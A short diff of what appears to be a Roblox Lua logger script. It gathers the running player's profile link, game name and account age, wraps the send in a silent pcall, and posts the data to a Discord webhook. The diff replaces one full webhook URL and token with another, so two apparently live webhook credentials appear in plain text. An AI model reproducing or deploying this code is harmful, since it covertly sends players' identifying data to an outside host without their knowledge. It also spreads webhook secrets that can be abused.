@@ -3,7 +3,7 @@ local profilelink = 'https://roblox.com/users/' .. game.Players.LocalPlayer.User
 local gamelink = 'https://roblox.com/games/' .. game.PlaceId .. '/' .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local accountage = game.Players.LocalPlayer.AccountAge .. ' days'
 
-local Webhook = 'https://discord.com/api/webhooks/1073693855335071795/h7f-p59rEQmIc_ja4gJY-vIWmIkurDBE_SVB1rqAo21SfrtBnuyUaMMBs7nTaoBMwSHG'
+local Webhook = 'https://discord.com/api/webhooks/1077276860934803647/wr90ppNJtcWHnye5T657ONymQ-HHnAxmi1VCI32l4I2ksjFaDDAPM1pxyxO5kUcxKjG3'
 pcall(function()
 local data = {
 ["embeds"] = {
